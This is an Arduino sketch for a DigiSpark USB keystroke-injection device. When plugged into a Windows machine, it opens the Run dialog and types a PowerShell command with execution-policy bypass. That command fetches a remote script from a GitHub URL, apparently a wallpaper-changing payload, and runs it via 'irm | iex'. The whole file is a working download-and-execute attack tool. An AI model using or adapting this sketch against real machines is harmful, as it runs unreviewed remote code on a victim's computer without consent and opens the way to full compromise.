#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("powershell -nop -ep bypass -c irm https://raw.githubusercontent.com/S3bDur/DigiSpark/refs/heads/main/usb-payloads/03-wallpaperRedirect/03-wallpaperRedirect-script.ps1|iex"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
  }
}